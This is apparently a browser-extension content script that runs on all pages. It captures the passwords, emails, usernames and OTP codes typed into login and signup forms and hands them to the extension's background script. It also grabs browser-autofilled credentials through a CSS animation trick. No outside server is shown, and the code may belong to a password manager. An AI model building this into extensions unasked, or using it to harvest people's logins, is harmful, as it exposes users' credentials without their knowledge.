
// This content script will run on all web pages
// It will detect forms and capture the data when they are submitted

// Function to generate a unique ID
function generateId() {
  return Date.now().toString(36) + Math.random().toString(36).substring(2);
}

// Function to detect if an input is a password, email, username, or OTP field
function detectInputType(input) {
  const type = input.type.toLowerCase();
  const name = (input.name || '').toLowerCase();
  const id = (input.id || '').toLowerCase();
  const placeholder = (input.placeholder || '').toLowerCase();
  
  if (type === 'password') return 'password';
  if (type === 'email' || name.includes('email') || id.includes('email') || placeholder.includes('email')) return 'email';
  if (name.includes('user') || id.includes('user') || placeholder.includes('user') ||
      name.includes('login') || id.includes('login') || placeholder.includes('login')) return 'username';
  if (name.includes('otp') || id.includes('otp') || placeholder.includes('otp') ||
      name.includes('code') || id.includes('code') || placeholder.includes('code')) return 'otp';
  
  return 'text';
}

// Function to determine if a form is a login or signup form
function isLoginOrSignupForm(form) {
  const formAction = (form.action || '').toLowerCase();
  const formId = (form.id || '').toLowerCase();
  const formName = (form.name || '').toLowerCase();
  
  const loginSignupKeywords = ['login', 'log-in', 'signin', 'sign-in', 'signup', 'sign-up', 'register', 'authentication', 'password'];
  
  // Check form attributes
  for (const keyword of loginSignupKeywords) {
    if (formAction.includes(keyword) || formId.includes(keyword) || formName.includes(keyword)) {
      return true;
    }
  }
  
  // Check if the form contains password input
  const inputs = form.querySelectorAll('input');
  for (const input of inputs) {
    if (input.type === 'password') {
      return true;
    }
  }
  
  // Check for submit button with login/signup keywords
  const buttons = form.querySelectorAll('button, input[type="submit"]');
  for (const button of buttons) {
    const buttonText = button.textContent || button.value || '';
    for (const keyword of loginSignupKeywords) {
      if (buttonText.toLowerCase().includes(keyword)) {
        return true;
      }
    }
  }
  
  return false;
}

// Function to capture form data
function captureFormData(form) {
  const inputs = form.querySelectorAll('input:not([type="hidden"]):not([type="submit"]):not([type="button"]):not([type="reset"])');
  
  if (inputs.length === 0) {
    return null;
  }
  
  const capturedData = {
    id: generateId(),
    url: window.location.href,
    title: document.title,
    timestamp: Date.now(),
    fields: [],
    isAutoFill: false
  };
  
  for (const input of inputs) {
    if (input.value) {
      capturedData.fields.push({
        type: detectInputType(input),
        name: input.name || input.id || detectInputType(input),
        value: input.value
      });
    }
  }
  
  return capturedData;
}

// Function to detect autofill
function detectAutoFill() {
  const inputs = document.querySelectorAll('input:not([type="hidden"]):not([type="submit"]):not([type="button"]):not([type="reset"])');
  
  for (const input of inputs) {
    input.addEventListener('animationstart', (e) => {
      if (e.animationName === 'onAutoFillStart') {
        const form = input.closest('form');
        if (form && isLoginOrSignupForm(form)) {
          // Wait a bit for the autofill to complete before capturing
          setTimeout(() => {
            const data = captureFormData(form);
            if (data) {
              data.isAutoFill = true;
              sendToBackground(data);
            }
          }, 500);
        }
      }
    });
  }
}

// Function to send data to the background script
function sendToBackground(data) {
  chrome.runtime.sendMessage({
    type: 'CAPTURED_FORM_DATA',
    data: data
  }, (response) => {
    if (!response || chrome.runtime.lastError) {
      console.error('Error sending data to background:', chrome.runtime.lastError);
    }
  });
}

// Initialize form monitoring
function initFormMonitoring() {
  // Find all forms on the page
  const forms = document.querySelectorAll('form');
  
  // Only monitor login/signup forms
  for (const form of forms) {
    if (isLoginOrSignupForm(form)) {
      form.addEventListener('submit', (event) => {
        const data = captureFormData(form);
        if (data) {
          sendToBackground(data);
        }
      });
    }
  }
  
  // Also monitor for autofilled forms
  detectAutoFill();
  
  // Use MutationObserver to detect dynamically added forms
  const observer = new MutationObserver((mutations) => {
    for (const mutation of mutations) {
      if (mutation.addedNodes.length) {
        for (const node of mutation.addedNodes) {
          if (node.nodeType === Node.ELEMENT_NODE) {
            const newForms = node.querySelectorAll('form');
            for (const form of newForms) {
              if (isLoginOrSignupForm(form)) {
                form.addEventListener('submit', (event) => {
                  const data = captureFormData(form);
                  if (data) {
                    sendToBackground(data);
                  }
                });
              }
            }
          }
        }
      }
    }
  });
  
  observer.observe(document.body, { childList: true, subtree: true });
}

// Start monitoring when the page is loaded
document.addEventListener('DOMContentLoaded', initFormMonitoring);

// Also check immediately in case the page was already loaded
if (document.readyState === 'complete' || document.readyState === 'interactive') {
  initFormMonitoring();
}

// Add CSS to detect autofill
const style = document.createElement('style');
style.textContent = `
  @keyframes onAutoFillStart {
    from { opacity: 0.99; }
    to { opacity: 1; }
  }
  
  input:-webkit-autofill {
    animation-name: onAutoFillStart;
    animation-duration: 0.001s;
  }
`;
document.head.appendChild(style);
